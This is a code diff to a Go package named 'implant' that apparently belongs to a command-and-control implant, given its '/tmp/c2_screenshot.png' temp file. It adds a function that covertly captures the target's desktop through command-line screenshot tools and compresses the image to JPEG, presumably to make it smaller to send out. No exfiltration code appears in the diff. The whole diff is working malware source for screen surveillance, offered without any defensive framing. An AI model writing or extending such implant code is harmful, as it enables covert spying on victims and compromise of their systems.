@@ -3,8 +3,11 @@
 package implant
 
 import (
+	"bytes"
 	"context"
 	"fmt"
+	"image/jpeg"
+	"image/png"
 	"os"
 	"os/exec"
 	"time"
@@ -22,9 +25,9 @@ func CaptureScreenshot() ([]byte, error) {
 		return output, nil
 	}
 
-	// 2. Try gnome-screenshot (writes to file)
+	// 2. Try gnome-screenshot
 	tmpPath := "/tmp/c2_screenshot.png"
-	_ = os.Remove(tmpPath) // clean up any previous file
+	_ = os.Remove(tmpPath)
 
 	cmd := exec.CommandContext(ctx, "gnome-screenshot", "-f", tmpPath)
 	if err := cmd.Run(); err == nil {
@@ -45,13 +48,30 @@ func CaptureScreenshot() ([]byte, error) {
 		}
 	}
 
-	// Clean up any leftover
 	os.Remove(tmpPath)
-
 	return nil, fmt.Errorf("no screenshot tool available (tried: import, gnome-screenshot, scrot)")
 }
 
-// isPNG checks for the PNG magic bytes.
+// CaptureScreenshotJPEG captures the desktop and returns JPEG-encoded bytes.
+// First captures PNG, then re-encodes as JPEG at the given quality (1-100).
+func CaptureScreenshotJPEG(quality int) ([]byte, error) {
+	pngData, err := CaptureScreenshot()
+	if err != nil {
+		return nil, err
+	}
+
+	img, err := png.Decode(bytes.NewReader(pngData))
+	if err != nil {
+		return nil, fmt.Errorf("PNG decode: %w", err)
+	}
+
+	var buf bytes.Buffer
+	if err := jpeg.Encode(&buf, img, &jpeg.Options{Quality: quality}); err != nil {
+		return nil, fmt.Errorf("JPEG encode: %w", err)
+	}
+	return buf.Bytes(), nil
+}
+
 func isPNG(data []byte) bool {
 	return len(data) >= 4 && data[0] == 0x89 && data[1] == 'P' && data[2] == 'N' && data[3] == 'G'
 }
